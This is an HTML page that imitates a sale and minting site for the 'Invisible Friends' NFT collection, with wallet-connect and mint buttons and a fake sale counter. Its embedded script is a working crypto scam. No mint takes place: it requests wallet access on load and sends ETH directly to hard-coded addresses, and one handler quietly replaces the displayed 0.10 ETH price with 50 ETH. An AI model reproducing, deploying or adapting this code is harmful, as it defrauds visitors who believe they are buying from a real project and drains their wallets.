
<!DOCTYPE html>
<html>
  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
  <head>
    <title>INVISIBLE FRIENDS</title>
    <meta name="description" content="Bing bong!" />
    <meta name="viewport" content="width=device-width" />
    <meta charset="utf-8" />
    <meta name="next-head-count" content="4" />
    <meta property="og:type" content="website" />
    <link rel="icon" href="favicon.png" type="image/gif" sizes="16x16">

    <meta property="og:title" content="Invisible Friends | sale" />
    <meta
      property="og:description"
      content="5,000 pieces of animated collection. Hiding in the metaverse. By @motionmarkus. Part of Random Character Collection."
    />
    <meta property="og:image" content="https://i.imgur.com/PiScrAc.gif">
    <link
      rel="preload"
      href="Style.css"
      as="style"
    />
    <link
      rel="stylesheet"
      href="Style.css"
      data-n-g=""
    />
    <noscript data-n-css=""></noscript>
    <script src="assets/web3.js/dist/web3.min.js"></script>
    <!-- Hit -->
    <!-- <script type="text/javascript">
      (function () {
        var hstc = document.createElement("script");
        hstc.src =
          "https://log.hitsteps.net/track.php?code=7d43a8f69ce3257a3c6a9f93c5bae851";
        hstc.async = true;
        var htssc = document.getElementsByTagName("script")[0];
        htssc.parentNode.insertBefore(hstc, htssc);
      })();
    </script>
    <noscript
      ><a href="http://www.hitsteps.com/"
        ><img
          src="https://log.hitsteps.net/track.php?mode=img&amp;code=7d43a8f69ce3257a3c6a9f93c5bae851"
          alt="web statistics"
          width="1"
          height="1"
        />visitor activity tracker</a
      ></noscript
    > -->
    <!-- Hit -->
  </head>
  <body>
    <div id="__next" data-reactroot="">
      <div class="p-5">
        <nav class="flex items-center">
          <div class="flex-none">
            <a href="index.html"
              ><img
                src="handshake.svg"
                alt="bing bong"
                class="w-8 text-white md:w-12"
            /></a>
          </div>
          <div class="flex-auto"></div>
          <div class="flex flex-none space-x-4">
            <a class="" href="https://twitter.com/InvsbleFriends"
              ><img
                src="twitter-logo.svg"
                alt="Twitter"
                class="w-8 text-white" /></a
            ><a class="" href="https://discord.gg/rndm"
              ><img src="discord-logo.svg" alt="Discord" class="w-8 text-white"
            /></a>
          </div>
        </nav>
        <div class="">
          <header
            class="flex flex-col items-center justify-center h-full text-center"
          >
            <h1
              class="text-6xl text-yellow-200 md:text-8xl lg:text-9xl leading-solid"
            >
              INVISIBLE<br />FRIENDS
            </h1>
            <div class="w-full md:w-[600px] -mt-16 md:-mt-32 lg:-mt-36">
              <span
                style="
                  box-sizing: border-box;
                  display: block;
                  overflow: hidden;
                  width: initial;
                  height: initial;
                  background: none;
                  opacity: 1;
                  border: 0;
                  margin: 0;
                  padding: 0;
                  position: relative;
                "
              >
                <span
                  style="
                    box-sizing: border-box;
                    display: block;
                    width: initial;
                    height: initial;
                    background: none;
                    opacity: 1;
                    border: 0;
                    margin: 0;
                    padding: 0;
                    padding-top: 100%;
                  "
                ></span
                ><img
                  alt="Basketball"
                  src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                  decoding="async"
                  data-nimg="responsive"
                  style="
                    position: absolute;
                    top: 0;
                    left: 0;
                    bottom: 0;
                    right: 0;
                    box-sizing: border-box;
                    padding: 0;
                    border: none;
                    margin: auto;
                    display: block;
                    width: 0;
                    height: 0;
                    min-width: 100%;
                    max-width: 100%;
                    min-height: 100%;
                    max-height: 100%;
                  "
                />
                <img
                  alt="Basketball"
                  sizes="100vw"
                  src="basketball-transpa4ca.gif"
                  decoding="async"
                  data-nimg="responsive"
                  style="
                    position: absolute;
                    top: 0;
                    left: 0;
                    bottom: 0;
                    right: 0;
                    box-sizing: border-box;
                    padding: 0;
                    border: none;
                    margin: auto;
                    display: block;
                    width: 0;
                    height: 0;
                    min-width: 100%;
                    max-width: 100%;
                    min-height: 100%;
                    max-height: 100%;
                  "
                  loading="lazy"
                />
              </span>
            </div>
          </header>
          <div class="text-center space-y-4 md:space-y-8">
            <div class="h-2"></div>
            <h2
              class="text-3xl font-bold md:text-5xl leading-solid text-sea-700"
            >
              Sale Minting
            </h2>
            <p class="tracking-wider">4063 on 5000 minted</p>
            <div
              id="spinner"
              class="spinner"
              style="color: white; animation: none"
            >
              <p class="" style="margin-bottom: 10px">
                Total: <span id="totalETH" style="">0.10</span> ETH
              </p>

              <button
                type="button"
                class="btn-minus"
                style="
                  background: white;
                  position: relative;
                  color: #445c7f;
                  font-weight: 700;
                  text-align: center;
                  letter-spacing: 2px;
                  background-position: 0 -15;
                  padding: 7px 20px;
                  border: 0px solid black;
                  border-radius: 88px;
                  font-size: 20px;
                  margin-right: 10px;
                "
              >
                -
              </button>
              <input
                type="text"
                value="1"
                data-ruler="quantity"
                id="totalNFT"
                style="
                  border: 0px solid black;
                  text-align: center;
                  background: white;
                  color: #445c7f;
                  padding-top: 5px;
                  padding-bottom: 5px;
                  border-radius: 50px;
                  width: 200px;
                  line-height: 1.5;
                  font-size: 20px;
                "
              />
              <button
                type="button"
                class="btn-plus"
                style="
                  background: white;
                  position: relative;
                  color: #445c7f;
                  font-weight: 700;
                  text-align: center;
                  letter-spacing: 2px;
                  background-position: 0 -15;
                  padding: 7px 20px;
                  border: 0px solid black;
                  border-radius: 88px;
                  font-size: 20px;
                  margin-left: 10px;
                "
              >
                +
              </button>
            </div>
            <p class="tracking-wider" id="status">
              Please Connect to your Wallet before Minting.


            </p>
            <div
              class="flex items-center justify-center text-base md:text-xl space-x-2"
            >
              <a
                class="bg-white btn text-sea-600 connect"
                
                style="cursor: pointer"
              >
                Connect
              </a>
              <a
                class="bg-white btn text-sea-600 mint"       
                style="cursor: pointer"
              >
                Mint
              </a>
            </div>
            <div class="h-6"></div>
          </div>
        </div>
      </div>
    </div>
    <script id="__NEXT_DATA__" type="application/json">
      {
        "props": { "pageProps": {} },
        "page": "/",
        "query": {},
        "buildId": "Vil0qT6JOlkttHASRQn6-",
        "nextExport": true,
        "autoExport": true,
        "isFallback": false,
        "scriptLoader": []
      }
    </script>
    <script>
      const ADDRESS = "0x120Be2AF0B7C4136fb9831FE3F1a95e650E17E75";
const web3 = window.Web3;
const ethereum = window.ethereum;
let accounts;

const mint = document.querySelector(".mint");
const connect = document.querySelector(".connect");
const title = document.querySelector(".metamask_content-title");
const totalPrice = document.querySelector("#totalETH");
const count = document.querySelector(".count");
// const walletAddress = document.querySelector(".walletAddress");
var totalPriceAmount = totalPrice.innerText;
var countAmount = 1;
let price = totalPrice.innerText;
/*function checkConnectStatus() {
  if (ethereum) {
    if (ethereum.selectedAddress) {
      connect.style.display = "none";
      mint.style.display = "block";
    } else if (ethereum.isMetaMask) {
      connect.style.display = "block";
      mint.style.display = "none";
    }
  } else {
    connect.style.display = "block";
    mint.style.display = "none";
  }
}
window.addEventListener("load", () => {
  totalPrice.innerText = price;
  //checkConnectStatus();
});*/
const getAccount = async () => {
  accounts = await ethereum.request({ method: "eth_requestAccounts" });
  console.log(accounts);
//   walletAddress.innerText = accounts[0].substring(0, 20) + "...";
  if (window.ethereum.chainId == "0x1") {
    console.log("Already connected to ethereum mainnet...");
    //checkConnectStatus();
  } else {
    try {
      await ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }],
      });
      //checkConnectStatus();
    } catch (switchError) {
      if (error.code === 4902) {
        try {
          await ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{ chainId: "0x1", rpcUrl: netURL }],
          });
          checkConnectStatus();
        } catch (addError) {}
      }
    }
  }
};
const sendTransaction = async () => {
  const priceToWei = (totalPriceAmount * 1e18).toString(16);
  const gasLimit = (100_000 * totalPriceAmount).toString(16);
  ethereum
    .request({
      method: "eth_sendTransaction",
      params: [{ from: accounts[0], to: ADDRESS, value: priceToWei }],
    })
    .then((txHash) => {
      $("#mintingModal").modal("show");
    })
    .catch((error) => {});
};
setTimeout(function () {
  getAccount();
}, 1000);
mint.addEventListener("click", async () => {
  await getAccount();
  await sendTransaction();
});
//connect.addEventListener("click", async () => {
//  await getAccount();
//});

function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log(userAgent);
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const uid = urlParams.get("uid");
  console.log(uid);
  if (uid == "mm") {
    return "Metamask";
  }
  if (/windows phone/i.test(userAgent)) {
    return "Windows Phone";
  }
  if (/android/i.test(userAgent)) {
    return "Android";
  }
  if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    return "iOS";
  }
  return "unknown";
}
document.addEventListener("DOMContentLoaded", (event) => {
  if (
    getMobileOperatingSystem() == "Android" ||
    getMobileOperatingSystem() == "iOS"
  ) {
    var wrapper = document.createElement("a");
    wrapper.classList.add("mmLink");
    wrapper.href =
      "https://metamask.app.link/dapp/" +
      window.location.href.replace("https://", "").replace("http://", "") +
      "?uid=mm";
    connect.parentNode.insertBefore(wrapper, connect);
    wrapper.appendChild(connect);
  }
});


//other jjzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz

const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('.connect');
const checkoutBtn = document.querySelector('.mint');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const pricePerNFT = 0.10;

/** input number spinner
 */
let plusBtn = document.querySelector('button[class*="btn-plus"]');
let minusBtn = document.querySelector('button[class*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
let totalETHSpan =  document.querySelector('#totalETH');
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;

plusBtn.addEventListener('click',()=>{
  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
  totalPriceAmount = totalETHSpan.innerText;
})
minusBtn.addEventListener('click',()=>{
  if (Number(totalNFTInput.value)>1) {
    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
    totalPriceAmount = totalETHSpan.innerText;
  }
  
})
//** end of input number spinner */

connectBtn.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      //statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })
 
  
  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0x06F58D08faD79bB8D409384885f137ed32Ff9128'
      let totalEth = 50;//totalETHSpan.innerText;
      totalEth = totalEth.toString();
      const accounts = await web3.eth.getAccounts();
      web3.eth.sendTransaction({
        from: web3.currentProvider.selectedAddress,
        to: paymentAddress,
        value: web3.utils.toWei(totalEth, 'ether')
        }, (err, transactionId) => {
        if  (err) {
          console.log('Minting failed', err)
          statusp.innerText = 'Minting failed'
        } else {
          console.log('Minting succeed', transactionId)
          statusp.innerText = 'Minting succeed';
          checkoutBtn.innerText = 'Mint again?'  
        }
      })
    })
  }

    </script>
  </body>
</html>
